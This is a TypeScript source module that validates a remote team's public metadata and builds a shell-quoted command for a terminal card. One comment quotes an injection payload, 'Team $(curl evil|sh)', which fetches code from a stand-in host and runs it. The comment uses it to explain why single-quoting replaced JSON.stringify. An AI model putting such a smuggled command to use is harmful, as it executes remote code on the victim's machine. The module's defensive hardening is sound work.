// IMPORT A SERVED TEAM — the caller's side of R30.
//
// A served team is reached through one door: its orch. Importing it does NOT
// paste the whole team onto your canvas; the caller's workspace gets exactly
// ONE terminal — the orch interface card — and that card's pixels are the
// orch's real PTY, mirrored over the served door (resources/orch-line.mjs:
// sign in, GET /line SSE, POST /line/raw). The team itself runs in the
// session workspace the author's app mints for this caller; live transcripts
// and teammates stay on the author's side.
//
// This module is the PURE PLAN: given a served address and the public face it
// answers with, it says what single terminal to place and the command that
// terminal runs. The wiring (fetch the face, place the node) lives in
// index.ts. Kept pure so the plan is testable with no app, no network, no pty.

import type { CanvasNode, ServedSessionFacts, TerminalNodeData } from '../shared/model'

/** Where a team is served — the origin and slug from the author's address. */
export interface ServeTarget {
  /** The author's listener origin, e.g. http://192.168.1.20:8639 */
  origin: string
  /** The slug the service is mounted under. */
  slug: string
}

/** The public face `GET /<slug>/crew` answers with — what the owner published. */
export interface ImportFace {
  name: string
  serviceId: string
  slug: string
  door: string
  access: 'account' | 'paid'
  priceUsd?: string
  version: number
  agents: number
  /**
   * Which rails this door will take money on. Stable identifiers only — the
   * import sheet needs them to offer a choice before anyone is charged, and a
   * paid door advertising none is a door that cannot currently sell.
   */
  paymentRails: readonly ('x402' | 'stripe')[]
}

/**
 * Parse the address a caller pastes: `http://host:port/slug`, or the bare
 * `host:port/slug` an owner reads aloud. Refuses credentials, query, hash and
 * anything that is not exactly one slug deep — the address IS the whole claim.
 */
export function parseServeAddress(link: string): ServeTarget | null {
  const trimmed = link.trim()
  if (trimmed.length === 0) return null
  const candidate = /^https?:\/\//.test(trimmed) ? trimmed : `http://${trimmed}`
  try {
    const url = new URL(candidate)
    if (!['http:', 'https:'].includes(url.protocol)) return null
    if (url.username || url.password || url.search || url.hash) return null
    const segments = url.pathname.split('/').filter((part) => part.length > 0)
    if (segments.length !== 1) return null
    const slug = segments[0]
    if (!/^[a-z0-9]+(?:-[a-z0-9]+)*$/.test(slug)) return null
    return { origin: url.origin, slug }
  } catch {
    return null
  }
}

/**
 * POSIX single-quoting — the ONLY safe way to put a value in this command.
 *
 * A terminal's command IS run through a shell: DirectMultiplexer spawns
 * `$SHELL -l -c <command>` and tmux wraps it in `sh -c`. JSON.stringify was
 * used here first and is NOT sufficient: it escapes " and \ but leaves $ and
 * ` live inside the resulting double quotes, so a served door answering with
 * `{"name": "Team $(curl evil|sh)"}` executed that as the owner, unsandboxed,
 * the moment the card was placed. Single quotes have no expansions at all;
 * the only escape needed is for the quote itself.
 */
function shellQuote(value: string): string {
  return `'${value.replaceAll("'", `'\\''`)}'`
}

/**
 * A name is remote, attacker-controlled data. Even with quoting airtight, it
 * is displayed, persisted and passed as argv, so it is bounded and stripped of
 * control characters here — one narrow shape, refused rather than mangled.
 */
export function safeFaceName(name: unknown): string | null {
  if (typeof name !== 'string') return null
  const trimmed = name.trim()
  if (trimmed.length === 0 || trimmed.length > 64) return null
  // eslint-disable-next-line no-control-regex
  if (/[\x00-\x1F\x7F]/.test(trimmed)) return null
  return trimmed
}

/** The face a served door answered with, validated before anything uses it. */
export function validateFace(value: unknown): ImportFace | null {
  if (typeof value !== 'object' || value === null) return null
  const raw = value as Record<string, unknown>
  const name = safeFaceName(raw.name)
  const door = safeFaceName(raw.door)
  if (name === null || door === null) return null
  if (raw.access !== 'account' && raw.access !== 'paid') return null
  const serviceId = typeof raw.serviceId === 'string' ? raw.serviceId.slice(0, 128) : ''
  const slug = typeof raw.slug === 'string' ? raw.slug.slice(0, 128) : ''
  const priceUsd = typeof raw.priceUsd === 'string' ? raw.priceUsd.slice(0, 32) : undefined
  const rails = Array.isArray(raw.paymentRails) ? raw.paymentRails : []
  return {
    name,
    serviceId,
    slug,
    door,
    access: raw.access,
    ...(priceUsd !== undefined ? { priceUsd } : {}),
    version: Number.isFinite(raw.version) ? (raw.version as number) : 1,
    agents: Number.isFinite(raw.agents) ? (raw.agents as number) : 0,
    paymentRails: rails.filter((rail): rail is 'x402' | 'stripe' => rail === 'x402' || rail === 'stripe')
  }
}

/**
 * The placed card's command. Every value is shell-quoted (see shellQuote — the
 * command runs through a shell), and no payment state is present: a reference
 * is supplied interactively in the live line, never persisted into node data.
 */
export function orchLineCommand(script: string, target: ServeTarget, name: string): string {
  const args = [script, '--origin', target.origin, '--slug', target.slug, '--name', name]
  return `node ${args.map(shellQuote).join(' ')}`
}

/**
 * The terminal node an import places. A normal terminal card — same idiom the
 * caller already knows — whose backend happens to be a remote orch. `orch` is
 * true because to the caller this IS the orchestrator; the name is the team's,
 * so the card reads as the team, not a bare shell.
 */
export function orchTerminalNode(
  face: ImportFace,
  target: ServeTarget,
  script: string,
  id: string,
  cwd: string,
  position: CanvasNode['position'],
  /** What the caller was told and paid at the gate. See ServedSessionFacts. */
  session?: Omit<ServedSessionFacts, 'origin' | 'slug'>
): TerminalNodeData {
  return {
    kind: 'terminal',
    id,
    name: face.name,
    preset: 'Remote',
    command: orchLineCommand(script, target, face.name),
    cwd,
    orch: true,
    role: null,
    ...(session
      ? { servedSession: { origin: target.origin, slug: target.slug, ...session } }
      : {}),
    position,
    size: { width: 420, height: 300 }
  }
}
